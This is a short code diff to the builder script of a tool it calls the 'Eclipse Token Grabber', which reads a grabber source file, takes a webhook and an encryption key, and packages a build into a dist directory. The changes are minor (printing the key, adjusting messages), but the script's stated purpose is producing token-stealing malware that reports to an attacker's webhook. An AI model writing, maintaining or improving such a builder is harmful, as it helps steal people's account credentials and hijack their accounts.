@@ -19,6 +19,7 @@ ECLIPSE_GRABBER_PATH = path.join("code", "eclipse-grabber.py")
 
 KEY = Fernet.generate_key().decode()
 
+
 def build(webhook: str, out_file: str):
     code_file = open(ECLIPSE_GRABBER_PATH, 'r')
     code = code_file.read()
@@ -72,9 +73,10 @@ def get_args() -> Namespace:
 
 def main(args: Namespace):
     print(TITLE)
+    print("[+] Encryption Key:", KEY)
     print("\n[+] Building Eclipse Token Grabber, please wait...")
     build(args.webhook, args.outfile)
-    print("\n\n[+] Successfully Built!",
+    print("\n[+] Successfully Built!",
           "\n\n[+] You can find it inside the dist directory")
 
 
